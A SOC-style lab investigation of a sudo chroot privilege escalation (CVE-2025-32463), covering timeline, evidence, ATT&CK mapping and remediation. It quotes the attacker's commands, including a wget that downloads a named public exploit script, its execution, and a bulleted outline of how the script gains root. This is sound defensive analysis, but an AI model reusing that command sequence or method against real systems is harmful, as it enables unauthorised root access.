# SOC Investigation: CVE-2025-32463 Sudo Privilege Escalation

## Overview

This investigation analyzes a successful local privilege-escalation attempt exploiting **CVE-2025-32463**, a vulnerability affecting `sudo` chroot functionality. The activity began under the `devuser` account and progressed from host reconnaissance and exploit download to execution of a malicious script. Process telemetry showed `/bin/bash` followed with more discovery commands executing as **root**, providing strong evidence that privilege escalation succeeded.

> **Note:** This investigation was performed in a controlled security lab for defensive analysis and SOC practice.

---

## Alert Summary

| Field | Value |
|---|---|
| **CVE** | CVE-2025-32463 |
| **Alert Type** | Privilege Escalation |
| **Severity** | High |
| **Affected Host** | `ubuntu-dev` |
| **Source User** | `devuser` |
| **Escalated User** | `root` |
| **Primary Process** | `/usr/bin/bash` |
| **Primary Technique** | Exploitation for Privilege Escalation |
| **Investigation Verdict** | **True Positive – Successful Privilege Escalation** |

### Initial Alert

The SOC alert identified suspicious use of `sudo -R` associated with CVE-2025-32463. The alert provided the starting point for reviewing terminal history and process telemetry.

<img width="2048" height="553" alt="Screenshot 2026-09-07 130801" src="https://github.com/user-attachments/assets/0612152a-2b15-4e24-ba6b-f10f127ca36e" />

---

## Investigation Timeline

| Time | Activity | Analyst Interpretation |
|---|---|---|
| 19:55:20 | `whoami` | Identified the current user context. |
| 19:55:25 | `uname -a` | Collected operating-system/kernel information. |
| 19:55:35 | `sudo -V` | Checked the installed `sudo` version before exploitation. |
| 19:56:10 | `wget .../CVE-2025-32463_chwoot/.../sudo-chwoot.sh` | Downloaded the CVE proof-of-concept from GitHub. |
| 19:56:40 | `chmod +x /home/devuser/sudo-chwoot.sh` | Made the exploit script executable. |
| 19:57:10 | `/home/devuser/sudo-chwoot.sh` | Executed the exploit. |
| 19:58:23 | `mktemp -d /tmp/sudowoot.stage.XXXXXX` | Created a temporary staging directory used by the exploit. |
| 19:59:34 | `id` under a root-owned shell | Verified post-exploitation execution in a root context. |
| 19:59:37 | `uname -a` under root | Performed post-escalation system discovery. |
| 19:59:45 | `cat /etc/os-release` under root | Collected additional operating-system information after escalation. |

---

## Evidence Analysis

### 1. Reconnaissance and Exploit Download

Terminal history showed `devuser` checking the host and `sudo` version before retrieving a script explicitly named for **CVE-2025-32463** from GitHub using `wget`.

```bash
whoami
uname -a
sudo -V
wget https://raw.githubusercontent.com/pr0v3rbs/CVE-2025-32463_chwoot/main/sudo-chwoot.sh -O /home/devuser/sudo-chwoot.sh
```

This sequence is consistent with an operator validating the target environment and then transferring a privilege-escalation tool to the host.


<img width="1676" height="594" alt="Screenshot 2026-09-07 131519" src="https://github.com/user-attachments/assets/290539aa-d130-4f89-a0a9-d8e2c4e82f53" />


---

### 2. Exploit Preparation and Execution

The downloaded script was granted execute permissions and then launched from the `devuser` home directory. Shortly afterward, the exploit created a temporary directory under `/tmp` for staging.

```bash
chmod +x /home/devuser/sudo-chwoot.sh
/home/devuser/sudo-chwoot.sh
mktemp -d /tmp/sudowoot.stage.XXXXXX
```

The tight timing between these events strongly links the staging directory to execution of the downloaded exploit.

<img width="586" height="169" alt="Screenshot 2026-09-07 134903" src="https://github.com/user-attachments/assets/6452d8be-0a7a-424a-92c7-443185fad29c" />


---

### 3. Exploit Script Analysis

Review of `sudo-chwoot.sh` showed that the script:

- Creates a temporary staging directory.
- Builds a crafted chroot-style directory structure.
- Writes a malicious shared-library payload.
- Compiles the shared object with `gcc`.
- Uses `sudo -R` against the crafted environment.
- Calls `setreuid(0,0)` and `setregid(0,0)` inside the payload to obtain UID/GID 0.
- Launches `/bin/sh` with the supplied command, defaulting to `/bin/bash` when no command is provided.
- Removes the staging directory after execution.

The script contents align directly with the observed process behavior and the CVE-specific alert.


<img width="1958" height="725" alt="Screenshot 2026-09-07 141221" src="https://github.com/user-attachments/assets/0e27b01a-f778-42b9-af0e-0e7b1be2f6dc" />


---

### 4. Staging Activity Under `devuser`

Process telemetry recorded `mktemp -d /tmp/sudowoot.stage.XXXXXX` from a `bash` process running as `devuser`. This confirms that the exploit's staging behavior occurred in the original non-root user context.


<img width="1862" height="686" alt="Screenshot 2026-09-07 131012" src="https://github.com/user-attachments/assets/5e123592-a638-4fac-abba-98ed73be94dd" />


---

### 5. Root-Level Command Execution

After exploit execution, process telemetry showed `/usr/bin/bash` running as **root** and executing commands including:

```bash
id
uname -a
cat /etc/os-release
```

The transition from `devuser`-owned exploit activity to root-owned shell execution is the strongest evidence that the local privilege escalation succeeded.


<img width="1900" height="650" alt="Screenshot 2026-09-08 221704" src="https://github.com/user-attachments/assets/214b4761-e6a4-4437-b9f4-2ec345cffebd" />




---

## MITRE ATT&CK Mapping

| Technique | Name | Evidence |
|---|---|---|
| **T1068** | Exploitation for Privilege Escalation | CVE-2025-32463 exploit was executed to transition from `devuser` to root. |
| **T1105** | Ingress Tool Transfer | `wget` downloaded `sudo-chwoot.sh` from GitHub to the target host. |
| **T1059.004** | Command and Scripting Interpreter: Unix Shell | `bash`/shell processes were used to execute the exploit and follow-on commands. |
| **T1033** | System Owner/User Discovery | `whoami` and `id` were used to identify or verify the active user context. |
| **T1082** | System Information Discovery | `uname -a` and `cat /etc/os-release` gathered host and operating-system information. |

> The script also deletes its temporary staging directory after execution. While this resembles **T1070.004 – File Deletion**, the observed cleanup alone is not enough to determine whether the intent was defense evasion or normal proof-of-concept cleanup.

---

## Key Findings

- The `devuser` account performed reconnaissance before exploitation.
- A CVE-specific privilege-escalation script was downloaded from GitHub.
- The script was made executable and launched from `/home/devuser/`.
- A temporary `/tmp/sudowoot.stage.*` directory was created as part of exploit execution.
- Review of the script confirmed creation of a malicious shared library and use of `sudo -R`.
- Process telemetry showed the activity beginning as `devuser` and later executing `/bin/bash` and discovery commands as `root`.
- The alert is a **true positive with successful privilege escalation**.

---

## Response Actions

1. **Contain the affected host** if the activity is not authorized testing.
2. **Upgrade `sudo` to a vendor-patched release** that remediates CVE-2025-32463.
3. **Review authentication and SSH activity** to determine how `devuser` access was obtained.
5. **Hunt for additional root-level commands** executed after privilege escalation.

---

## Investigation Conclusion

**True Positive – Successful Privilege Escalation**

The investigation identified a complete privilege-escalation chain associated with **CVE-2025-32463**. `devuser` checked the target environment, downloaded and executed a CVE-specific exploit, and created the expected temporary staging environment. Static review of the script showed the malicious shared-library and `sudo -R` logic used to obtain UID/GID 0. Process telemetry then recorded `/bin/bash` and follow-on discovery commands executing as `root`. Taken together, the alert, terminal history, script contents, and process telemetry provide strong evidence that exploitation succeeded.

---

## Skills Demonstrated

- SOC alert triage and validation
- Linux process and terminal-history analysis
- MITRE ATT&CK mapping
- Timeline reconstruction and evidence correlation
- Root-cause analysis and remediation planning

---

